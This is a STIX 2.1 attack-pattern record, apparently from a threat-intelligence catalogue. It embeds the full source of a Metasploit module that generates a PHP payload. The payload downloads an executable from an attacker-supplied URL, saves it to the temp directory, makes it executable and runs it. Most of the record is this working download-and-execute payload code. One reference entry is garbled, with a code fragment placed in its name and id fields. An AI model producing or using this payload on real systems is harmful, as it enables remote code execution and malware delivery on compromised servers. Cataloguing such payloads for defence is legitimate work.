{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dc70a0ea-938c-4eb2-8037-57d4cb6d9de9",
    "created": "2024-08-14T16:33:19.287324Z",
    "modified": "2024-08-14T16:33:19.287328Z",
    "name": "PHP Executable Download and Execute",
    "description": "Download an EXE from an HTTP URL and execute it",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/php/download_exec.rb",
            "external_id": "download_exec.rb"
        },
        {
            "source_name": "$fd_in=fopen(\"#{datastoreURL}\"",
            "external_id": "\"rb\");"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Php\n  include Msf::Payload::Single\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'PHP Executable Download and Execute',\n      'Description'   => 'Download an EXE from an HTTP URL and execute it',\n      'Author'        => [ 'egypt' ],\n      'License'       => BSD_LICENSE,\n      'Platform'      => 'php',\n      'Arch'          => ARCH_PHP,\n      'Privileged'    => false\n      ))\n\n    # EXITFUNC is not supported :/\n    deregister_options('EXITFUNC')\n\n    # Register command execution options\n    register_options(\n      [\n        OptString.new('URL', [ true, \"The pre-encoded URL to the executable\" ])\n      ])\n  end\n\n  def php_exec_file\n    exename = Rex::Text.rand_text_alpha(rand(8) + 4)\n    dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)\n    shell = <<-END_OF_PHP_CODE\n    #{php_preamble(disabled_varname: dis)}\n    if (!function_exists('sys_get_temp_dir')) {\n      function sys_get_temp_dir() {\n        if (!empty($_ENV['TMP'])) { return realpath($_ENV['TMP']); }\n        if (!empty($_ENV['TMPDIR'])) { return realpath($_ENV['TMPDIR']); }\n        if (!empty($_ENV['TEMP'])) { return realpath($_ENV['TEMP']); }\n        $tempfile=tempnam(uniqid(rand(),TRUE),'');\n        if (file_exists($tempfile)) {\n          @unlink($tempfile);\n          return realpath(dirname($tempfile));\n        }\n        return null;\n      }\n    }\n    $fname = sys_get_temp_dir() . DIRECTORY_SEPARATOR . \"#{exename}.exe\";\n    $fd_in = fopen(\"#{datastore['URL']}\", \"rb\");\n    if ($fd_in === false) { die(); }\n    $fd_out = fopen($fname, \"wb\");\n    if ($fd_out === false) { die(); }\n    while (!feof($fd_in)) {\n      fwrite($fd_out, fread($fd_in, 8192));\n    }\n    fclose($fd_in);\n    fclose($fd_out);\n    chmod($fname, 0777);\n    $c = $fname;\n    #{php_system_block(cmd_varname: \"$c\", disabled_varnam: dis)}\n    @unlink($fname);\n    END_OF_PHP_CODE\n\n    #return Rex::Text.compress(shell)\n    return shell\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    return php_exec_file\n  end\nend\n",
    "x_mitre_platforms": [
        "php'"
    ]
}